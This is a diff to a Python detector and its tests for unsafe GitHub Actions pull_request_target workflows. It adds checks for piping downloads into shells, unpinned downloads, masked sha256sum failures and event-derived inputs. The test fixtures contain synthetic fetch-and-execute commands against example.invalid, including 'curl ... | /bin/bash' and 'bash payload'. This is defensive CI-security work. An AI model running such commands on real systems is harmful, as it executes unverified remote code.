@@ -79,7 +79,7 @@ URL_INSTALL = re.compile(
 )
 # Output of any command piped into an interpreter is executed.
 PIPE_TO_INTERPRETER = re.compile(
-    r"\|\s*(?:sudo\s+)?(?:(?:ba|z|da|k)?sh|eval|source|python[\d.]*|node|perl|ruby)\b"
+    r"\|\s*(?:sudo\s+)?(?:\S*/)?(?:(?:ba|z|da|k)?sh|eval|source|python[\d.]*|node|perl|ruby)\b"
 )
 # Artifact/repository downloads from outside this run.
 FOREIGN_DOWNLOAD = re.compile(
@@ -106,7 +106,20 @@ ALLOWED_ACTIONS = (
 SCRIPT_PROCESS = re.compile(
     r"child_process|\bexec\.(?:exec|getExecOutput)\b|\bspawn(?:Sync)?\("
 )
-NETWORK_TOOL = re.compile(r"(?<![\w./-])(?:curl|wget|gh\s+api)\b")
+NETWORK_TOOL = re.compile(
+    r"(?:^|[\s;&|(`'\"])(?:\S*/)?(?:curl|wget)\b|(?<![\w./-])gh\s+api\b"
+)
+# The only accepted integrity check: a literal digest piped into sha256sum.
+CHECKSUM_LINE = re.compile(
+    r'^\s*echo\s+"(?:\$\{?(?P<var>\w+)\}?|(?P<hex>[0-9a-f]{64}))\s+(?P<target>[^"\s]+)"\s*\|\s*sha256sum\s+-c\s+-\s*$'
+)
+# Scripts the privileged jobs execute from trusted checkouts; pinned too.
+PRIVILEGED_SCRIPTS = (
+    "scripts/ci/runtime_os_adapter.py",
+    "scripts/ci_risk_classifier.py",
+    "scripts/ci_risk_classifier_core.py",
+    "scripts/review_receipt_validator.py",
+)
 EXPRESSION_IN_BODY = re.compile(r"\$\{\{")
 
 
@@ -276,6 +289,29 @@ def _git_violations(script: str) -> list[str]:
             if index >= len(tokens):
                 break
             verb, args = tokens[index], tokens[index + 1 :]
+            redirect = next(
+                (
+                    i
+                    for i, arg in enumerate(args)
+                    if arg[:1] in "<>" or arg[:2] in {"1>", "2>"}
+                ),
+                len(args),
+            )
+            args = args[:redirect]
+            operands = [arg for arg in args if not arg.startswith("-")]
+            # Operand limits: no pathspecs that could narrow what is diffed or
+            # checked; fetch takes a remote and one object.
+            limits = {
+                "fetch": 2,
+                "cat-file": 1,
+                "diff": 2,
+                "ls-files": 0,
+                "rev-parse": 1,
+                "status": 0,
+            }
+            if verb in limits and (len(operands) > limits[verb] or "--" in args):
+                problems.append(f"git {verb} with extra operands: {' '.join(args)}")
+                break
             allowed = GIT_ALLOWED_OPTIONS.get(verb)
             if allowed is None:
                 problems.append(f"git {verb}")
@@ -392,6 +428,19 @@ def _job_violations(
 
     expand(where, steps)
     tainted = job_tainted | _tainted_env(*(step for _, step in expanded))
+    event_env = set()
+    for scope in (workflow, job, *(step for _, step in expanded)):
+        for name, value in (
+            (scope.get("env") or {}) if isinstance(scope, dict) else {}
+        ).items():
+            normalized = _normalize(value)
+            fields = EVENT_EXPRESSION.findall(normalized)
+            if re.search(r"\bgithub\.event\b(?!\.)", normalized) or any(
+                field not in INPUT_EVENT_FIELDS
+                and not field.startswith(INPUT_EVENT_PREFIXES)
+                for field in fields
+            ):
+                event_env.add(str(name))
     for scope in (workflow, job, *(step for _, step in expanded)):
         for name, value in (
             (scope.get("env") or {}) if isinstance(scope, dict) else {}
@@ -461,7 +510,22 @@ def _job_violations(
                     f"{label} downloads foreign artifacts via {sorted(foreign)}"
                 )
         for field, value in (step.get("with") or {}).items():
-            for expression in EVENT_EXPRESSION.findall(_normalize(value)):
+            normalized = _normalize(value)
+            for name in event_env:
+                if any(
+                    re.search(rf"\benv\.{re.escape(name)}\b", expression)
+                    for expression in EXPRESSION.findall(normalized)
+                ):
+                    violations.append(
+                        f"{label} feeds event-derived env.{name} into input {field}"
+                    )
+            if re.search(r"\bgithub\.event\b(?!\.)", normalized) or re.search(
+                r"\b(?:fromJSON|toJSON)\s*\(\s*github\b", normalized
+            ):
+                violations.append(
+                    f"{label} feeds the raw event payload into input {field}"
+                )
+            for expression in EVENT_EXPRESSION.findall(normalized):
                 if expression not in INPUT_EVENT_FIELDS and not expression.startswith(
                     INPUT_EVENT_PREFIXES
                 ):
@@ -502,33 +566,28 @@ def _job_violations(
             if NETWORK_TOOL.search(line) and _shell_names_pr_ref(line, tainted):
                 violations.append(f"{label} downloads PR-head content: {line.strip()}")
         if NETWORK_TOOL.search(script):
-            # Downloads must be integrity-pinned in the same step, and the pin
-            # must name the downloaded file; the head SHA is reachable through
+            # Downloads must be integrity-pinned in the same step: an
+            # ``echo "<digest>  <file>" | sha256sum -c -`` line whose digest is
+            # a literal (or a variable assigned a literal) and that names the
+            # downloaded file; the head SHA is reachable through
             # GITHUB_EVENT_PATH without naming it.
-            check_lines = [
-                line
-                for line in script.splitlines()
-                if re.search(r"\bsha256sum\b[^\n]*\s-c\b", line)
-            ]
-            targets = [
-                target
-                for line in script.splitlines()
-                if NETWORK_TOOL.search(line)
-                for target in (DOWNLOAD_TARGET.findall(line) or ["<stdout>"])
-            ]
-            for target in targets:
-                name = target.strip("${}")
-                spellings = (
-                    {target, f"${name}", f"${{{name}}}"}
-                    if target.startswith("$")
-                    else {target}
-                )
-                if not any(
-                    spelling in line for line in check_lines for spelling in spellings
-                ):
-                    violations.append(
-                        f"{label} downloads {target} without a sha256sum -c pin on it"
-                    )
+            literal_vars = set(re.findall(r"^\s*(\w+)=[0-9a-f]{64}\s*$", script, re.M))
+            pinned_targets = set()
+            for line in script.splitlines():
+                match = CHECKSUM_LINE.match(line)
+                if match and (match["hex"] or match["var"] in literal_vars):
+                    pinned_targets.add(match["target"].strip("${}"))
+            for line in script.splitlines():
+                if "sha256sum" in line and "||" in line:
+                    violations.append(f"{label} masks a sha256sum failure")
+            for line in script.splitlines():
+                if not NETWORK_TOOL.search(line):
+                    continue
+                for target in DOWNLOAD_TARGET.findall(line) or ["<stdout>"]:
+                    if target.strip("${}") not in pinned_targets:
+                        violations.append(
+                            f"{label} downloads {target} without a sha256sum -c pin on it"
+                        )
     return violations
 
 
@@ -591,8 +650,10 @@ KNOWN_VIOLATIONS: set[str] = set()
 
 def _repository_scan() -> tuple[list[str], list[str], dict[str, str]]:
     """Scan every workflow; return PRT workflows, violations, and the sha256 of
-    every file that defines privileged behaviour (PRT workflows plus every
-    local reusable workflow and composite action they reach)."""
+    the files reviewed as privileged: PRT workflows, every local reusable
+    workflow and composite action (with its directory) they reach, and the
+    scripts the Runtime OS advisory executes from its trusted checkouts.
+    Scope is pull_request_target only (not workflow_run/issue_comment)."""
     scanned: list[str] = []
     violations: list[str] = []
     files: dict[str, str] = {}
@@ -605,9 +666,19 @@ def _repository_scan() -> tuple[list[str], list[str], dict[str, str]]:
         violations.extend(
             pull_request_target_violations(workflow, path.name, reach=reach)
         )
-        for reached in reach["files"]:
+        reached_files = set(reach["files"])
+        for reached in list(reached_files):
+            if Path(reached).name in {"action.yml", "action.yaml"}:
+                # Files beside a composite action run via $GITHUB_ACTION_PATH.
+                reached_files.update(
+                    item for item in Path(reached).parent.rglob("*") if item.is_file()
+                )
+        for reached in reached_files:
             relative = Path(reached).resolve().relative_to(ROOT).as_posix()
             files[relative] = hashlib.sha256(Path(reached).read_bytes()).hexdigest()
+    if "ci-runtime-os-advisory.yml" in scanned:
+        for relative in PRIVILEGED_SCRIPTS:
+            files[relative] = hashlib.sha256((ROOT / relative).read_bytes()).hexdigest()
     return scanned, violations, files
 
 
@@ -1114,7 +1185,7 @@ def test_detector_rejects_frozen_head_review_bypasses(workflow: dict[Any, Any]) 
             {
                 "run": (
                     'curl -sSfL -o rg.tgz "https://github.com/o/r/releases/download/1/rg.tgz"\n'
-                    'echo "abc  rg.tgz" | sha256sum -c -'
+                    'echo "' + "a" * 64 + '  rg.tgz" | sha256sum -c -'
                 )
             }
         ]),
@@ -1370,3 +1441,86 @@ def test_reusable_workflow_keeps_the_callers_merge_ref_triggers(tmp_path: Path) 
     assert any(
         "without the non-PR-event guard" in violation for violation in violations
     ), violations
+
+
+@pytest.mark.parametrize(
+    ("workflow", "reason"),
+    [
+        # Review round on 95e282b1.
+        (
+            _prt([
+                {
+                    "env": _H,
+                    "run": '/usr/bin/curl -sL "https://example.invalid/$H/run.sh" | /bin/bash',
+                }
+            ]),
+            "pipes command output into an interpreter",
+        ),
+        (
+            _prt([{"run": "/usr/bin/curl -sSfL -o p https://example.invalid/p"}]),
+            "downloads p without a sha256sum -c pin",
+        ),
+        (
+            _prt(
+                [
+                    {
+                        "uses": "actions/upload-artifact@" + _SHA,
+                        "with": {"name": "x", "path": "${{ env.P }}"},
+                    }
+                ],
+                env={"P": "${{ github.event.pull_request.body }}"},
+            ),
+            "feeds event-derived env.P into input path",
+        ),
+        (
+            _prt([
+                {
+                    "uses": "actions/upload-artifact@" + _SHA,
+                    "with": {
+                        "name": "x",
+                        "path": "${{ fromJSON(toJSON(github.event)).pull_request.body }}",
+                    },
+                }
+            ]),
+            "feeds the raw event payload into input path",
+        ),
+        (
+            _prt([
+                {
+                    "env": _H,
+                    "run": 'git fetch origin "$H"\ngit diff --name-only "$B" "$H" docs/',
+                }
+            ]),
+            "git diff with extra operands",
+        ),
+        (
+            _prt([
+                {
+                    "run": "git status --porcelain=v1 --untracked-files=all .github/workflows"
+                }
+            ]),
+            "git status with extra operands",
+        ),
+        (
+            _prt([
+                {
+                    "run": "curl -sSfL -o payload https://example.invalid/p\necho 'bad  payload' | sha256sum -c - || true\nbash payload"
+                }
+            ]),
+            "masks a sha256sum failure",
+        ),
+        (
+            _prt([
+                {
+                    "run": "curl -sSfL -o payload https://example.invalid/p\nsha256sum payload > sum\nsha256sum -c sum\nbash payload"
+                }
+            ]),
+            "downloads payload without a sha256sum -c pin",
+        ),
+    ],
+)
+def test_detector_rejects_round_95e282b1_bypasses(
+    workflow: dict[Any, Any], reason: str
+) -> None:
+    violations = pull_request_target_violations(workflow, "synthetic", root=None)
+    assert any(reason in violation for violation in violations), violations
